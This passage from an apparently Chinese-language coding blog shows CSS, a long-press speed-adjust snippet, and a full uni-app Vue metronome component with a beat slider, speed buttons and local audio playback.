class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">flex-direction</span>: column;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#f5f5f5</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.label</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.value</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#007aff</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.slider</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">90%</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.button-group</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">gap</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.button</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#007aff</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.play-button</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#34c759</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">15px</span> <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.play-button</span><span class="selector-pseudo">:active</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#32a852</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="实现长按-0"><a href="#实现长按-0" class="headerlink" title="实现长按  + -0"></a>实现长按  + -0</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">&quot;button&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">click</span>=<span class="string">&quot;increaseSpeed&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">longpress</span>=<span class="string">&quot;startIncreaseSpeedLongPress&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">longpressend</span>=<span class="string">&quot;stopSpeedLongPress&quot;</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 长按开始</span></span><br><span class="line"><span class="title function_">handleLongPressStart</span>(<span class="params">action</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">longPressTimer</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (action === <span class="string">&#x27;increase&#x27;</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">increaseSpeed</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (action === <span class="string">&#x27;decrease&#x27;</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">decreaseSpeed</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, <span class="number">100</span>); <span class="comment">// 每100ms触发一次</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 长按结束</span></span><br><span class="line"><span class="title function_">handleLongPressEnd</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">longPressTimer</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">longPressTimer</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>完整</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 节拍显示 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;label&quot;</span>&gt;</span>节拍：<span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;value&quot;</span>&gt;</span>&#123;&#123; beat &#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 滑块定义节拍数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slider</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;slider&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">min</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">max</span>=<span class="string">&quot;10&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">step</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; beat &#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">change</span>=<span class="string">&quot;handleBeatChange&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">slider</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 速度显示 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;label&quot;</span>&gt;</span>速度：<span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;value&quot;</span>&gt;</span>&#123;&#123; speed &#125;&#125; BPM<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 增加/减少速度按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;button-group&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">&quot;button&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">click</span>=<span class="string">&quot;increaseSpeed&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">touchstart</span>=<span class="string">&quot;handleLongPressStart(&#x27;increase&#x27;)&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">touchend</span>=<span class="string">&quot;handleLongPressEnd&quot;</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">        加速</span><br><span class="line">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">&quot;button&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">click</span>=<span class="string">&quot;decreaseSpeed&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">touchstart</span>=<span class="string">&quot;handleLongPressStart(&#x27;decrease&#x27;)&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">touchend</span>=<span class="string">&quot;handleLongPressEnd&quot;</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">        减速</span><br><span class="line">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 播放/停止按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;play-button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;togglePlay&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123; playStatus === &#x27;playing&#x27; ? &#x27;停止&#x27; : &#x27;播放&#x27; &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">beat</span>: <span class="number">4</span>, <span class="comment">// 初始节拍数</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">speed</span>: <span class="number">60</span>, <span class="comment">// 初始速度（每分钟节拍数）</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">playStatus</span>: <span class="string">&#x27;stopped&#x27;</span>, <span class="comment">// 播放状态，初始为停止</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">intervalId</span>: <span class="literal">null</span>, <span class="comment">// 用于存储定时器ID</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">audioContext</span>: <span class="literal">null</span>, <span class="comment">// 音频上下文</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">longPressTimer</span>: <span class="literal">null</span>, <span class="comment">// 用于长按的定时器</span></span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 初始化音频上下文</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">initAudio</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">audioContext</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span> = uni.<span class="title function_">createInnerAudioContext</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">volume</span> = <span class="number">1.0</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 处理滑块改变节拍数的事件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">handleBeatChange</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">beat</span> = event.<span class="property">detail</span>.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">playStatus</span> === <span class="string">&#x27;playing&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">restartMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">playFirstBeatAudio</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 增加速度</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">increaseSpeed</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">speed</span> += <span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">playStatus</span> === <span class="string">&#x27;playing&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">restartMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">playFirstBeatAudio</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 减少速度</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">decreaseSpeed</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">speed</span> -= <span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">speed</span> &lt; <span class="number">5</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">speed</span> = <span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">playStatus</span> === <span class="string">&#x27;playing&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">restartMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">playFirstBeatAudio</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 长按开始</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">handleLongPressStart</span>(<span class="params">action</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">longPressTimer</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (action === <span class="string">&#x27;increase&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="title function_">increaseSpeed</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (action === <span class="string">&#x27;decrease&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="title function_">decreaseSpeed</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;, <span class="number">100</span>); <span class="comment">// 每100ms触发一次</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 长按结束</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">handleLongPressEnd</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">longPressTimer</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">longPressTimer</span> = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 切换播放/停止状态的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">togglePlay</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">playStatus</span> === <span class="string">&#x27;stopped&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">playStatus</span> = <span class="string">&#x27;playing&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">initAudio</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">startMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">playStatus</span> = <span class="string">&#x27;stopped&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">stopMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 启动节拍器的方法，通过定时器播放声音</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">startMetronome</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> intervalTime = <span class="number">60000</span> / <span class="variable language_">this</span>.<span class="property">speed</span>; <span class="comment">// 根据速度计算每个节拍的间隔时间（毫秒）</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> currentBeat = <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">intervalId</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">playBeatAudio</span>(currentBeat);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (currentBeat === <span class="variable language_">this</span>.<span class="property">beat</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          currentBeat = <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          currentBeat++;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;, intervalTime);</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 停止节拍器的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">stopMetronome</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">intervalId</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">intervalId</span> = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 重启节拍器（用于更新速度或节拍）</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">restartMetronome</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="title function_">stopMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="title function_">startMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 播放第一拍音频的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">playFirstBeatAudio</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">beat</span> &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">audioContext</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">beat</span> === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">src</span> = <span class="string">&#x27;/static/sounds/a2.mp3&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">          &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">src</span> = <span class="string">&#x27;/static/sounds/a3.mp3&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">play</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 根据当前拍数播放音频的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">playBeatAudio</span>(<span class="params">currentBeat</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">beat</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">audioContext</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (currentBeat === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">src</span> = <span class="string">&#x27;/static/sounds/a2.mp3&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">src</span> = <span class="string">&#x27;/static/sounds/a3.mp3&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">play</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span 